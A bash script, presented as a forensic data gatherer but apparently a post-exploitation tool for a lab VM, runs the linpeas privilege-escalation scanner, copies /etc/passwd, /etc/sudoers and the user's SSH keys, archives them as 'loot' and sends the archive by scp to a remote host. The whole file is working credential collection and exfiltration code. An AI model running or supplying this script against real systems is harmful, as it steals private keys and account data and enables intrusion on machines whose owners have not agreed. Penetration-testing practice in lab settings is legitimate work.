#!/bin/bash
#
# Script to gather useful forensic data and scp it to a remote host.
#

# === Configuration Section ===
# Edit these variables to match your environment

HOST_USERNAME="yourHostUsername"         # Your host's username
HOST_IP="192.168.56.1"                   # IP address (or hostname) of your host machine
HOST_DEST_DIR="~/loot"                   # Destination directory on the host
LINPEAS_PATH="/path/to/linpeas.sh"       # Path to the linpeas script on this VM

# === Gathering Data ===

# 1. Run linpeas and capture output
echo "[+] Running linpeas..."
sudo bash "$LINPEAS_PATH" > linpeas_output.txt 2>/dev/null

# 2. Grab /etc/passwd
echo "[+] Copying /etc/passwd..."
sudo cp /etc/passwd passwd.txt

# 3. Grab /etc/sudoers
echo "[+] Copying /etc/sudoers..."
sudo cp /etc/sudoers sudoers.txt

# 4. Grab SSH keys (user-level). 
#    If you want system-wide keys too, add /etc/ssh or other relevant directories.
echo "[+] Copying SSH keys..."
if [ -d "$HOME/.ssh" ]; then
    cp -r "$HOME/.ssh" ssh_keys
else
    echo "[-] No user SSH keys found in $HOME/.ssh"
fi

# 5. Get iptables configuration
echo "[+] Collecting iptables information..."
sudo iptables -L > iptables.txt

# === Archiving Data ===

# 6. Create a tar.gz of all collected files
echo "[+] Creating archive..."
ARCHIVE_NAME="loot_$(date +%Y%m%d_%H%M%S).tar.gz"
tar -czvf "$ARCHIVE_NAME" \
    linpeas_output.txt \
    passwd.txt \
    sudoers.txt \
    iptables.txt \
    ssh_keys/ 2>/dev/null

echo "[+] Archive created: $ARCHIVE_NAME"

# === Transfer Data Off the VM ===

# 7. Use SCP to send the archive to the host machine
echo "[+] Transferring archive to $HOST_IP..."
scp "$ARCHIVE_NAME" "$HOST_USERNAME@$HOST_IP:$HOST_DEST_DIR"

# Cleanup if you wish
# rm linpeas_output.txt passwd.txt sudoers.txt iptables.txt
# rm -rf ssh_keys
# rm "$ARCHIVE_NAME"

echo "[+] Done!"